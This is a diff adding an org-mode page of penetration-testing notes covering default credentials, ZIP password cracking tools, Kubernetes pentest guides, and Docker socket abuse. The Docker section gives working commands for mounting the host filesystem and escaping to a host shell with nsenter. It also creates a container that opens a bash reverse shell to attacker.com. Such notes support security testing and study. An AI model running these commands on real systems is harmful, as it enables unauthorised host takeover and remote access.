@@ -1,0 +1,61 @@
+#+TITLE: General and miscellaneous items
+#+INCLUDE: ../../../templates/rtfsg.org
+
+
+* Default Credentials
+
+- [[https://github.com/ihebski/DefaultCreds-cheat-sheet][Ihebski's Default Credentials Collection]]: includes a CVS file and a Python
+  script to search through them. Or simply grep your way through the
+  README.md.
+
+* Password cracking
+*** ZIP files
+
+Use [[http://oldhome.schmorp.de/marc/fcrackzip.html][fcrackzip]] to crack passwords for ZIP files with a dictionary or brute-force.
+
+Programs like [[https://github.com/kimci86/bkcrack][bkcrack]] or [[https://github.com/keyunluo/pkcrack][pkcrack]] can perform a /known plaintext attack/ to
+recover the original data.
+
+* Kubernetes
+*** Guides
+
+Guide to [[https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions][risky permissions]] by [[https://www.cyberark.com/][CyberArk]] along with their pentest methodology
+parts [[https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1][1]], [[https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2][2]] and [[https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3][3]].
+
+* Docker
+*** Static image analysis
+
+Use tools like [[https://github.com/wagoodman/dive][dive]], [[https://github.com/GoogleContainerTools/container-diff][container-diff]] or simply =docker history= to inspect Docker
+images and their layers.
+
+*** Interact with a remote Docker instance through the socket
+
+#+begin_src shell
+$ # Forward the socket through SSH
+$ ssh [-nNT] -L localhost:4444:/var/run/docker.sock user@remote.com
+$ # Now we can execute docker commands remotely
+$ docker -H tcp://127.0.0.1:4444 run -v /:/host -it ubuntu:latest
+$ # Or curl the API
+$ curl --proxy localhost:4444 http://localhost/info
+$ # Or get a shell on the host
+$ docker -H tcp://127.0.0.1:4444 run --privileged --pid=host -it ubuntu nsenter -t 1 -m -u -n -i sh
+#+end_src
+
+*** API
+
+Use the following to create a container that will run =cmd= upon start and mount
+the host's root filesystem under =/mnt=:
+
+#+begin_src shell
+$ cmd="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\\\"\"]"
+$ curl -s -X POST --proxy localhost:2377 -d "{\"Image\":\"ubuntu\",\"cmd\":$cmd,\"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' 'http://localhost/containers/create?name=malicious'
+$ curl -s -X POST --proxy localhost:2377 "http://localhost/containers/malicious/start"
+#+end_src
+
+*** Shell on the host
+
+Get a shell on the host with this ([[https://medium.com/lucjuggery/a-container-to-access-the-shell-of-the-host-2c7c227c64e9][source]]):
+
+#+begin_src shell
+$ docker run --privileged --pid=host -it alpine:3.8 nsenter -t 1 -m -u -n -i sh
+#+end_src
